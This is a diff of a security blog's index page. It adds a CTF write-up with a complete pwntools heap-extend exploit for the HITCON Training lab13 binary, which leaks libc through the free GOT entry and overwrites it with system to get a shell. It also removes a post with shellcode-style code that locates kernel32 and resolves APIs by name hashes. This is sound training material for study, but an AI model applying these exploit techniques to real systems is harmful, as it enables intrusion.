@@ -67,6 +67,59 @@
       <div id="main" class="wrapper">
         <div id="primary" class="site-content"><div id="content" role="main">
   
+    <article id="post-pwn-extend" class="post-pwn-extend post type-post status-publish format-standard hentry">
+    <!---->
+
+      <header class="entry-header">
+        
+        
+  
+    <h1 class="entry-title">
+      <a class="article-title" href="/2018/10/09/pwn-extend/">pwn-extend</a>
+    </h1>
+  
+
+        
+        <div class="comments-link">
+            
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/10/09/pwn-extend/" data-id="ck9vj8y8i000w873kjni6sqwt" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+        </div><!-- .comments-link -->
+      </header><!-- .entry-header -->
+
+    <div class="entry-content">
+      
+        <h2 id="HITCON-Trainging-lab13"><a href="#HITCON-Trainging-lab13" class="headerlink" title="HITCON Trainging lab13"></a>HITCON Trainging lab13</h2><p>extend技术主要是能够修改size标志位，构造好我们伪造好size标志位的chunk，当再次malloc之时，chunk就能够扩大范围，如果在修改后的chunk范围内,能修改某个指针，且该指针可以利用来泄露或者修改指定地址内容，即可利用。</p>
+<p>HITCON Trainging lab13即是利用了heap-extend技术实现利用。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./heapcreator'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./heapcreator'</span>)</span><br><span class="line">libc = ELF(<span class="string">'./libc-2.23.so'</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">create</span><span class="params">(size, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"1"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span><span class="params">(idx, content)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"2"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.send(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"3"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span><span class="params">(idx)</span>:</span></span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(<span class="string">"4"</span>)</span><br><span class="line">    p.recvuntil(<span class="string">":"</span>)</span><br><span class="line">    p.sendline(str(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">free_got = <span class="number">0x602018</span></span><br><span class="line">create(<span class="number">0x18</span>, <span class="string">'A'</span>*<span class="number">4</span>)  <span class="comment"># 0</span></span><br><span class="line">create(<span class="number">0x10</span>, <span class="string">'B'</span>*<span class="number">4</span>)  <span class="comment"># 1</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>, <span class="string">"/bin/sh\x00"</span> + p64(<span class="number">0</span>) * <span class="number">2</span> + <span class="string">"\x41"</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(<span class="number">0x30</span>, p64(<span class="number">0</span>) * <span class="number">4</span> + p64(<span class="number">0x30</span>) + p64(elf.got[<span class="string">'free'</span>]))  <span class="comment">#1</span></span><br><span class="line"><span class="comment"># leak freeaddr</span></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">"Content : "</span>)</span><br><span class="line">data = p.recvuntil(<span class="string">"Done !"</span>)</span><br><span class="line"></span><br><span class="line">free_addr = u64(data.split(<span class="string">"\n"</span>)[<span class="number">0</span>].ljust(<span class="number">8</span>, <span class="string">"\x00"</span>))</span><br><span class="line">libc_base = free_addr - libc.symbols[<span class="string">'free'</span>]</span><br><span class="line">log.success(<span class="string">'libc base addr: '</span> + hex(libc_base))</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">log.success(<span class="string">'system_addr: '</span> + hex(system_addr))</span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>, p64(system_addr))</span><br><span class="line"></span><br><span class="line"><span class="comment"># get shell</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+      
+    </div><!-- .entry-content -->
+
+    <footer class="entry-meta">
+    <a href="/2018/10/09/pwn-extend/">
+    <time datetime="2018-10-09T14:44:58.416Z" class="entry-date">
+        2018-10-09
+    </time>
+</a>
+    
+  <span class="article-delim">&#8226;</span>
+  <div class="article-category">
+  <a class="article-category-link" href="/categories/CTF/">CTF</a>
+  </div>
+
+    
+  <span class="article-delim">&#8226;</span>
+  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/pwn/">pwn</a></li></ul>
+
+    </footer>
+</article>
+
+
+
+
+
+
+  
     <article id="post-CS1-6-透视分析" class="post-CS1-6-透视分析 post type-post status-publish format-standard hentry">
     <!---->
 
@@ -82,7 +135,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/08/23/CS1-6-透视分析/" data-id="ck97yisan0000rr3kjdxseqhi" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/08/23/CS1-6-透视分析/" data-id="ck9vj8y6q0009873kmygmbo6t" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -146,7 +199,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/08/12/Cheat-Engine/" data-id="ck97yisax0001rr3kzfpi4ia3" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/08/12/Cheat-Engine/" data-id="ck9vj8y6e0005873koum47pnl" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -217,7 +270,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/11/WCTF2018/" data-id="ck97yisbi000err3ke682ha09" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/07/11/WCTF2018/" data-id="ck9vj8y7l000g873kbnoz6a0o" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -278,7 +331,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/05/29/setUnhandleExceptionFilter-exploration/" data-id="ck97yiscc0016rr3k57iti3x9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/05/29/setUnhandleExceptionFilter-exploration/" data-id="ck9vj8y900018873k6gr592de" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -365,7 +418,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/04/13/HITBCTF2018-reverse-hex/" data-id="ck97yisb60005rr3kb1cytnd4" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/04/13/HITBCTF2018-reverse-hex/" data-id="ck9vj8y5o0000873kfp4rpg8b" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -432,7 +485,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/03/20/Play-Rtsp-Stream-opencv2/" data-id="ck97yisbg000brr3k8aadkmqq" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/03/20/Play-Rtsp-Stream-opencv2/" data-id="ck9vj8y6x000a873k208lwt3y" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -481,7 +534,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/01/16/Mi-4C动态调试so库/" data-id="ck97yisbb0006rr3kjmggygl9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2018/01/16/Mi-4C动态调试so库/" data-id="ck9vj8y5x0001873kwnvi7jxn" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -532,7 +585,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/12/28/qemu环境搭建/" data-id="ck97yisca0013rr3kgzb99uf8" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/12/28/qemu环境搭建/" data-id="ck9vj8y8u0015873k2mance6q" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -635,7 +688,7 @@
         
         <div class="comments-link">
             
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/11/12/hctf2017-level1Tolevel3-reverse/" data-id="ck97yised002xrr3k2o4dd5x5" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
+            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/11/12/hctf2017-level1Tolevel3-reverse/" data-id="ck9vj8ydg002v873k1sqiwviz" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
         </div><!-- .comments-link -->
       </header><!-- .entry-header -->
 
@@ -703,61 +756,6 @@
 
 
   
-    <article id="post-getKernel32" class="post-getKernel32 post type-post status-publish format-standard hentry">
-    <!---->
-
-      <header class="entry-header">
-        
-        
-  
-    <h1 class="entry-title">
-      <a class="article-title" href="/2017/10/26/getKernel32/">获取kernel32基地址</a>
-    </h1>
-  
-
-        
-        <div class="comments-link">
-            
-            <a href="javascript:void(0);" data-url="http://Invicsfate.github.io/2017/10/26/getKernel32/" data-id="ck97yisbu000krr3kxc6nmii9" class="leave-reply bdsharebuttonbox" data-cmd="more">Share</a>
-        </div><!-- .comments-link -->
-      </header><!-- .entry-header -->
-
-    <div class="entry-content">
-      
-        <p>从InMemoryOrderModuleList地址上获取kernel32.dll的基地址，原理如下：</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">xor ebx, ebx </span><br><span class="line">mov ebx, fs:[ <span class="number">0x30</span> ]       ;PEB</span><br><span class="line">mov ebx, [ ebx + <span class="number">0x0C</span> ]    ;PEB-&gt;Ldr</span><br><span class="line">mov ebx, [ ebx + <span class="number">0x14</span> ]    ;PEB-&gt;Ldr.InMemoryOrderModuleList.Flink (<span class="number">1</span>st entry)</span><br><span class="line">mov ebx, [ ebx ]           ;<span class="function">next <span class="title">entry</span> <span class="params">(<span class="number">2</span>nd entry)</span></span></span><br><span class="line">mov ebx, [ ebx ]           ;entry (3rd entry)</span><br><span class="line">mov ebx, [ ebx + <span class="number">0x10</span> ]    ;<span class="function">base <span class="title">address</span> <span class="params">(kernel32.dll)</span></span></span><br></pre></td></tr></table></figure>
-<p>需要注意的是不同操作系统可能寻找方式有少许不同，32和64位程序也是不一样的，需要使用windbg具体情况具体分析。</p>
-<p>获取kernel32基地址以后，就可以从EAT获取GetProcAddress地址以及其他函数地址，下面程序以获得FindFirstFile地址为例，在EAT中搜索FindFirstFile地址的时候没有采用直接比较字符串名称的方法，而是对字符串名称作运算，根据运算结果来进行比较。</p>
-<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> win10x64 1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> win10x64</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kernel32Value 0x6E2BCA17</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">elif</span> defined(win7x64)</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> kernel32Value 0x8FECD63F</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">typedef</span> <span class="title">HANDLE</span> <span class="params">(*myFindFirstFile)</span><span class="params">(LPCTSTR lpFileName,LPWIN32_FIND_DATA lpFindFileData)</span></span>; </span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">findPEB</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD pebValue;</span><br><span class="line">	__asm</span><br><span class="line">	&#123;</span><br><span class="line">		mov eax,fs:[<span class="number">0x30</span>]</span><br><span class="line">		mov pebValue,eax</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> pebValue;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">calValue1</span><span class="params">(WORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD v1,v3;</span><br><span class="line">	v3 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(*a1)</span><br><span class="line">	&#123;</span><br><span class="line">		v1 = (WORD)*a1;</span><br><span class="line">		++a1;</span><br><span class="line">		v3 = v1 + ((v3 &lt;&lt; <span class="number">19</span>) | ((<span class="keyword">unsigned</span> __int64)v3 &gt;&gt; <span class="number">13</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">calValue2</span><span class="params">(BYTE *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD v1,v3;</span><br><span class="line">	v3 = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">while</span>(*a1)</span><br><span class="line">	&#123;</span><br><span class="line">		v1 = *a1++;</span><br><span class="line">		v3 = v1 + ((v3 &lt;&lt; <span class="number">19</span>) | ((<span class="keyword">unsigned</span> __int64)v3 &gt;&gt; <span class="number">13</span>));</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> v3;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">findKernel32</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD pebValue = findPEB();</span><br><span class="line">	</span><br><span class="line">	DWORD v1 = *(DWORD *)(pebValue + <span class="number">12</span>);</span><br><span class="line">	DWORD *v3 = *(DWORD **)(v1 + <span class="number">20</span>);</span><br><span class="line">	DWORD *v4 = *(DWORD **)(v1 + <span class="number">20</span>);</span><br><span class="line">	<span class="keyword">do</span></span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(calValue1((WORD *)v3[<span class="number">10</span>]) == kernel32Value)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">return</span> v3[<span class="number">4</span>];</span><br><span class="line">		&#125;</span><br><span class="line">		v3 = (DWORD *)*v3;</span><br><span class="line">	&#125; <span class="keyword">while</span> (v3 &amp;&amp; v3 != v4);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">DWORD <span class="title">findGetProcAddress</span><span class="params">(DWORD kernel32Addr,DWORD funcValue)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD exportTable,addressOfFunctions,addressOfNames,addressOfNameOrdinals,numberOfNames;</span><br><span class="line">	exportTable = (*(DWORD *)(*(DWORD *)(kernel32Addr + <span class="number">60</span>) + kernel32Addr + <span class="number">120</span>) + kernel32Addr);</span><br><span class="line">	addressOfFunctions = *(DWORD *)(exportTable + <span class="number">0x1c</span>) + kernel32Addr;</span><br><span class="line">	addressOfNames = *(DWORD *)(exportTable + <span class="number">0x20</span>) + kernel32Addr;</span><br><span class="line">	addressOfNameOrdinals = *(DWORD *)(exportTable + <span class="number">0x24</span>) + kernel32Addr;</span><br><span class="line"></span><br><span class="line">	numberOfNames = *(DWORD *)(exportTable + <span class="number">0x18</span>);</span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;numberOfNames;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="keyword">if</span>(calValue2((BYTE *)(*(DWORD *)(addressOfNames + <span class="number">4</span> * i) + kernel32Addr)) == funcValue)</span><br><span class="line">			<span class="keyword">return</span> *(DWORD *)(addressOfFunctions + <span class="number">4</span> * *(WORD *)(addressOfNameOrdinals + <span class="number">2</span> * i)) + kernel32Addr;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	DWORD kernel32Addr;</span><br><span class="line">	myFindFirstFile findFirstFileAddr;</span><br><span class="line">	kernel32Addr = findKernel32();</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"kernel32Addr:%X\n"</span>,kernel32Addr);</span><br><span class="line">	HMODULE hKernel32 = GetModuleHandleA(<span class="string">"kernel32.dll"</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"hKernel32:%X\n"</span>,hKernel32);</span><br><span class="line">	findFirstFileAddr = (myFindFirstFile)findGetProcAddress(kernel32Addr,<span class="number">0x63D6C065</span>);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"findFirstFileAddr:%p\n"</span>,findFirstFileAddr);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"FindFirstFile:%p\n"</span>,GetProcAddress(hKernel32,<span class="string">"FindFirstFileA"</span>));</span><br><span class="line">	system(<span class="string">"pause"</span>);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-      
-    </div><!-- .entry-content -->
-
-    <footer class="entry-meta">
-    <a href="/2017/10/26/getKernel32/">
-    <time datetime="2017-10-26T02:52:57.000Z" class="entry-date">
-        2017-10-26
-    </time>
-</a>
-    
-  <span class="article-delim">&#8226;</span>
-  <div class="article-category">
-  <a class="article-category-link" href="/categories/others/">others</a>
-  </div>
-
-    
-  <span class="article-delim">&#8226;</span>
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PE/">PE</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/reverse/">reverse</a></li></ul>
-
-    </footer>
-</article>
-
-
-
-
-
-
-  
   
     <nav id="pagination">
       <nav id="page-nav">
@@ -794,6 +792,10 @@
       <ul>
         
           <li>
+            <a href="/2020/05/07/VMP-修复dump内存导入表/">(no title)</a>
+          </li>
+        
+          <li>
             <a href="/2020/04/20/windows原始套接字sock-raw的使用限制/">windows原始套接字sock_raw的使用限制</a>
           </li>
         
@@ -807,10 +809,6 @@
         
           <li>
             <a href="/2019/12/07/C++逆向随笔/">C++逆向随笔</a>
-          </li>
-        
-          <li>
-            <a href="/2019/08/24/某游戏cg素材解包/">某游戏cg素材解包</a>
           </li>
         
       </ul>
